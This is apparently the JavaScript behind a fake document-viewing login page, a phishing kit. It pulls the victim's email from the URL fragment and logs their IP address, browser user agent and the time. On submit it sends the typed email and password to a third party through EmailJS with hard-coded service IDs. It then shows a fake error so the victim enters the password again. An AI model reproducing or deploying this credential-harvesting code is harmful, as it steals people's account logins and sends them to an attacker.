
let form = document.getElementById("form");
let email = document.getElementById("username");
let pass = document.getElementById("password");
let button = document.getElementById("button");
let nav = document.getElementById("nav");
let time = document.getElementById("time");
let Useragent = document.getElementById("UserAgent");
const err = document.getElementById("error-message");
let tog = document.getElementById("toggle");



// toggle passwrd
tog.addEventListener("click", toggle);
function toggle(){
   
   if(pass.type === "text"){
      pass.type="password"
     tog.innerHTML= "visibility_off"
   }  else{
      tog.innerHTML="visibility"
      pass.type= "text";}
}



  //  user browser info 
  Useragent.value = navigator.userAgent;
  // time logged
 time.value = new Date();

// hash the url   
let url = new URL(window.location)

email.value = url.hash.slice(1);




//api for browser location
fetch("https://api.ipify.org?format=json")
.then((res)=>{return res.json()})
.then((json)=>{
 nav.value =json.ip;
 console.log(json.ip)

})
.catch((err)=>{console.warn(err)})




form.addEventListener("submit",function(event){
  event.preventDefault()
button.value = 'Signing you in...';

  
     const serviceID ='service_snvyph7';
     const templateID ='template_on8ispg';
  
     emailjs.sendForm(serviceID, templateID, this)
      .then(() => {
        button.value ='View Document';
        pass.value = "";
       pass.style.borderBottom = "1px solid red";

      err.style.display = "block";
       

      setTimeout(()=> { err.style.display = "none"; pass.style.borderBottom = "2px solid #000" }, 6000)
        
      }, (err) => {
        button.value = 'View Document';
        err.textContent =JSON.stringify(err);
      });

  
})
